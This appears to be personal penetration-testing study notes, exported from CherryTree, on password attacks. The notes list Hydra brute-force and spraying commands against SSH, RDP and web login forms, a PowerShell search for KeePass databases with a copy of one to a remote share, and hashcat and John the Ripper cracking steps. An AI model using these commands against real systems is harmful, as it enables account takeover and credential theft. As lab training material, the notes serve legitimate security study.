<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Password Attacks</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>Password Attacks</h1><br/><p># Password and Hashed attacks with common tools</p><p></p><p>SSH and RDP dictionary attacks with</p><p><h1>Hydra</h1></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400">## SSH Bruteforce</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists$ <span style="color:#ff9d00;font-weight:700">sudo</span> hydra -l george -P <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt<br />s 2222 <span style="color:#ff9d00;font-weight:700">ssh://</span>192.168.139.201<br /><span style="color:#0088ff;font-weight:400"># -l username known</span><br /><span style="color:#0088ff;font-weight:400"># -P passwords unknown</span><br /><br /><span style="color:#0088ff;font-weight:400">## Password Spraying against RDP</span><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> hydra -L <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>dirb<span style="color:#ff9d00;font-weight:700">/</span>others<span style="color:#ff9d00;font-weight:700">/</span>names.txt -р <span style="color:#3ad900;font-weight:400">&quot;SuperS3cure1337#&quot;</span><br />rdp<span style="color:#ff9d00;font-weight:700">://</span>192.168.139.202 </pre></div></p><p></p><p></p><p>POST Login Form dictionary attack</p><p><div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~$ <span style="color:#ff9d00;font-weight:700">sudo</span> hydra -l user -P <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt 192.168.122.201 <br />	http-post-form <span style="color:#3ad900;font-weight:400">&quot;/index.php: fm_usr=user&amp;fm_pwd=^PASS^:Login failed. Invalid&quot;</span><br /><span style="color:#0088ff;font-weight:400">#</span><br /><span style="color:#0088ff;font-weight:400">#fields:</span><br /><span style="color:#0088ff;font-weight:400"># 1 -&gt; index.php, login page</span><br /><span style="color:#0088ff;font-weight:400"># 2 -&gt; body of POST request (^PASS^ is payload)</span><br /><span style="color:#0088ff;font-weight:400"># 3 -&gt; failed login identifier</span></pre></div></p><p></p><p></p><p><h1>Hashcat</h1></p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># calculate hash rate</span><br />hashcat -b</pre></div></p><p></p><p>Windows encrypted password manager Attack Path</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># Locate File</span><br /><span style="color:#ff9d00;font-weight:700">Get-ChildItem</span> <span style="color:#ff9d00;font-weight:700">-</span>Path с<span style="color:#ff9d00;font-weight:700">:\</span> <span style="color:#ff9d00;font-weight:700">-</span>Include <span style="color:#ff9d00;font-weight:700">*</span>.kdbx <span style="color:#ff9d00;font-weight:700">-</span>File <span style="color:#ff9d00;font-weight:700">-</span>Recurse <span style="color:#333333;font-weight:400">-ErrorAction</span> SilentlyContinue<br /><br /><span style="color:#0088ff;font-weight:400"># copy to share</span><br /><span style="color:#ff9d00;font-weight:700">copy</span> .<span style="color:#ff9d00;font-weight:700">\</span>Documents <span style="color:#ff9d00;font-weight:700">\</span>Database.kdbx <span style="color:#ff9d00;font-weight:700">\\</span><span style="color:#333333;font-weight:400">192.168</span>.<span style="color:#333333;font-weight:400">122.139</span><span style="color:#ff9d00;font-weight:700">\</span>share<span style="color:#ff9d00;font-weight:700">\</span>Database.kdbx<br /><br /><span style="color:#0088ff;font-weight:400"># JohnTheRipper for keepass format</span><br />keepass2john database.kdbx &gt; password.hash<br /><span style="color:#0088ff;font-weight:400"># remove database: string because there&#39;s no username in keepass</span><br /><br /><span style="color:#0088ff;font-weight:400"># Find format</span><br />hashcat <span style="color:#ff9d00;font-weight:700">--</span>help | grep <span style="color:#ff9d00;font-weight:700">-</span>i <span style="color:#3ad900;font-weight:400">&quot;KeePass&quot;</span><br /><br /><span style="color:#0088ff;font-weight:400"># crack hash</span><br />hashcat <span style="color:#ff9d00;font-weight:700">-</span>m [numeroCrack] password.hash <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt <span style="color:#ff9d00;font-weight:700">-r</span> rulefile <span style="color:#ff9d00;font-weight:700">--</span>force<br /><span style="color:#0088ff;font-weight:400"># numeroCrack -&gt; output help command</span><br /><span style="color:#0088ff;font-weight:400"># rulefile -&gt; /usr/share/hashcat/rules/rockyou-30000.rule</span><br /><br /><br /> <br /></pre></div></p><p></p><p>mutating wordlists (rule based attack)</p><p><div class="codebox"><pre>kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#333333;font-weight:400">\$</span>1 &gt; demo.rule<br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss hashcat -r demo.rule --stdout demo.txt<br /><br /><span style="color:#0088ff;font-weight:400"># $1 nella rule aggiunge 1 alla fine di ogni password</span><br /><span style="color:#0088ff;font-weight:400"># $ appende, ^ prepende</span><br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss <span style="color:#ff9d00;font-weight:700">echo</span> c &gt;&gt; demo.rule<br /><span style="color:#0088ff;font-weight:400"># c rende la prima lettera di ogni password maiuscola</span><br /><br />kali@kali<span style="color:#ff9d00;font-weight:700">:</span>~<span style="color:#ff9d00;font-weight:700">/</span>passwordattackss <span style="color:#ff9d00;font-weight:700">echo</span> <span style="color:#333333;font-weight:400">\$</span><span style="color:#ff9d00;font-weight:700">!</span> &gt;&gt; demo.rule<br /><span style="color:#0088ff;font-weight:400"># append an ! </span><br /><br />hashcat -m 0 hash.txt <span style="color:#ff9d00;font-weight:700">/</span>usr<span style="color:#ff9d00;font-weight:700">/</span>share<span style="color:#ff9d00;font-weight:700">/</span>wordlists<span style="color:#ff9d00;font-weight:700">/</span>rockyou.txt -r demo.rule --force<br /><br /><br /></pre></div></p><p></p><p>how to crack an ssh private key passphrase</p><p><div class="codebox"><pre>ssh2john id_rsa &gt; ssh.hash<br /><span style="color:#0088ff;font-weight:400"># remove filename before first column</span><br /><span style="color:#0088ff;font-weight:400"># see $x$ to see correct hashcat mode</span><br /><br />hashcath <span style="color:#ff9d00;font-weight:700">|</span> <span style="color:#ff9d00;font-weight:700">grep</span> -i <span style="color:#3ad900;font-weight:400">&quot;ssh&quot;</span><br /><span style="color:#0088ff;font-weight:400"># number in output</span><br /><br /></pre></div></p><p></p><p><h1>JohnTheRipper</h1></p><p></p><p>To use rulefiles:</p><p><div class="codebox"><pre><span style="color:#0088ff;font-weight:400"># add [List.Rules:sshRules] to beginning of rule file</span><br /><span style="color:#0088ff;font-weight:400"># append rule file to /etc/john/john.conf</span><br /><br />john --wordlist=ssh.passwords --rules=sshRules ssh.hash</pre></div></p><p></p><p>Group Policy Passwords</p><p><div class="codebox"><pre>gpp-decrypt</pre></div></p></div>
</body>
</html>
